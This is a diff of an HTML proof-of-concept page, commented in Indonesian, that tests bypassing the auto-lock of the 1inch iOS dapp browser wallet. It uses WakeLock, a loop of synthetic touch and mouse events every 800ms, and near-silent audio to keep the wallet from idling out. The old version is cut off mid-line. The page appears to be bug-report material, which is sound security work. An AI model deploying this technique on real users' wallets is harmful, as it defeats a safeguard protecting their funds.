@@ -2,76 +2,102 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PoC Auto-Lock Bypass - 1inch iOS</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>PoC Auto-Lock FIX</title>
 <style>
-  body { font-family: monospace; background:#0e0e0e; color:#00ff88; padding:20px; }
-  .box { border:1px solid #00ff88; padding:15px; margin-top:15px; border-radius:10px; }
-  #timer { font-size:32px; font-weight:bold; }
-  button { background:#00ff88; border:0; padding:10px 20px; border-radius:8px; font-weight:bold; }
+  body{font-family:-apple-system,monospace;background:#111;color:#0f0;padding:16px}
+  .box{border:1px solid #0f0;border-radius:12px;padding:12px;margin:12px 0}
+  #timer{font-size:48px;font-weight:900;text-align:center}
+  button{width:100%;padding:16px;font-size:18px;font-weight:bold;background:#0f0;border:0;border-radius:12px;margin-top:10px}
+  #log{font-size:12px;max-height:200px;overflow:auto;background:#000;padding:8px}
 </style>
 </head>
 <body>
-  <h2>PoC Bug Auto-Lock 1inch iOS Dapp Browser</h2>
-  <div class="box">
-    <div>Status Visibility: <span id="vis">-</span></div>
-    <div>WakeLock Status: <span id="wake">inactive</span></div>
-    <div>Idle Timer: <span id="timer">00:00</span></div>
-    <div>Page Active: <span id="active">0s</span></div>
-  </div>
 
-  <div class="box" id="log">LOG:<br></div>
+<h3>PoC Auto-Lock 1inch - FIX TIMER</h3>
+<div class="box">
+  <div id="timer">00:00</div>
+  <div>Visibility: <b id="vis">unknown</b></div>
+  <div>Active: <b id="active">0s</b></div>
+  <div>WakeLock: <b id="wake">inactive</b></div>
+</div>
 
-  <button onclick="startBypass()">START BYPASS TEST</button>
-  <button onclick="stopBypass()">STOP</button>
+<button id="btn">KLIK UNTUK MULAI TEST</button>
+<div class="box" id="log">LOG READY...<br></div>
 
 <script>
-let seconds = 0;
-let activeSeconds = 0;
-let intervalMain, intervalFakeActivity;
-let wakeLock = null;
-
 const $ = id => document.getElementById(id);
-const log = msg => {
-  const time = new Date().toLocaleTimeString();
-  $('log').innerHTML += `[${time}] ${msg}<br>`;
+const logEl = $('log');
+function log(msg){
+  logEl.innerHTML += new Date().toLocaleTimeString() + ' - ' + msg + '<br>';
+  logEl.scrollTop = logEl.scrollHeight;
 }
 
-// 1. Timer yang seharusnya memicu auto-lock di wallet
-setInterval(() => {
-  seconds++;
-  activeSeconds++;
-  const m = String(Math.floor(seconds/60)).padStart(2,'0');
-  const s = String(seconds%60).padStart(2,'0');
-  $('timer').textContent = `${m}:${s}`;
-  $('active').textContent = `${activeSeconds}s`;
-}, 1000);
+let startTime = Date.now();
+let wakeLock = null;
+let fakeInterval = null;
+let timerInterval = null;
 
-// 2. Deteksi apakah dapp browser detect idle dengan benar
-document.addEventListener('visibilitychange', () => {
+function updateTimer(){
+  const diff = Math.floor((Date.now() - startTime) / 1000);
+  const m = String(Math.floor(diff/60)).padStart(2,'0');
+  const s = String(diff%60).padStart(2,'0');
+  $('timer').textContent = `${m}:${s}`;
+  $('active').textContent = diff + 's';
+}
+
+// Timer anti-throttle iOS
+timerInterval = setInterval(updateTimer, 100);
+updateTimer();
+
+document.addEventListener('visibilitychange', ()=>{
   $('vis').textContent = document.visibilityState;
-  log(`visibilitychange -> ${document.visibilityState}`);
+  log('visibilitychange: ' + document.visibilityState);
+});
+$('vis').textContent = document.visibilityState;
+
+$('btn').addEventListener('click', async () => {
+  startTime = Date.now(); // reset timer pas klik
+  log('User gesture diterima, mulai bypass...');
+  
+  // 1. WakeLock - harus di dalam click event di iOS
+  try{
+    if('wakeLock' in navigator){
+      wakeLock = await navigator.wakeLock.request('screen');
+      $('wake').textContent = 'ACTIVE';
+      log('WakeLock ACTIVE');
+      wakeLock.addEventListener('release', ()=>{ $('wake').textContent='released'; });
+    } else {
+      log('WakeLock tidak support di browser ini');
+    }
+  }catch(e){ log('WakeLock error: '+e.message); }
+
+  // 2. Fake activity - ini inti bug nya
+  if(fakeInterval) clearInterval(fakeInterval);
+  fakeInterval = setInterval(()=>{
+    window.dispatchEvent(new Event('touchstart'));
+    document.dispatchEvent(new Event('mousemove'));
+    // ini yang bikin auto-lock 1inch gagal reset
+  }, 800);
+  log('Fake activity loop jalan tiap 800ms');
+
+  // 3. Silent audio - harus setelah click di iOS
+  try{
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    const osc = ctx.createOscillator();
+    const gain = ctx.createGain();
+    gain.gain.value = 0.0001;
+    osc.connect(gain);
+    gain.connect(ctx.destination);
+    osc.start();
+    log('Silent audio started (gain 0.0001)');
+  }catch(e){ log('Audio error: '+e.message); }
+
+  $('btn').textContent = 'TEST BERJALAN... JANGAN SENTUH HP';
+  log('TEST MULAI. Diamkan 2 menit. Kalau wallet tidak lock = BUG CONFIRMED');
 });
 
-// 3. Inti bug: aktivitas palsu yang bikin wallet ngira user masih aktif
-function startBypass() {
-  log("Mulai test bypass auto-lock...");
-
-  // Teknik A: Wake Lock API - cegah layar sleep
-  if ('wakeLock' in navigator) {
-    navigator.wakeLock.request('screen').then(lock => {
-      wakeLock = lock;
-      $('wake').textContent = 'active';
-      log('WakeLock active - layar tidak akan sleep');
-    }).catch(e => log('WakeLock gagal: ' + e.message));
-  }
-
-  // Teknik B: Fake activity loop - ini yang bikin bug di banyak wallet
-  // Wallet hitung idle dari touch event, tapi setInterval ini reset timer internal
-  intervalFakeActivity = setInterval(() => {
-    // Simulasi activity kecil yang tidak terlihat user
-    window.dispatchEvent(new Event('touchstart'));
-    window.dispatchEvent(new Event('mousemove'));
-    // requestAnimationFrame juga sering bikin auto-lock gagal
-    requestAnimationFrame(()=>{});
-  }, 500
+log('Siap. Klik tombol di atas untuk mulai.');
+</script>
+</body>
+</html>
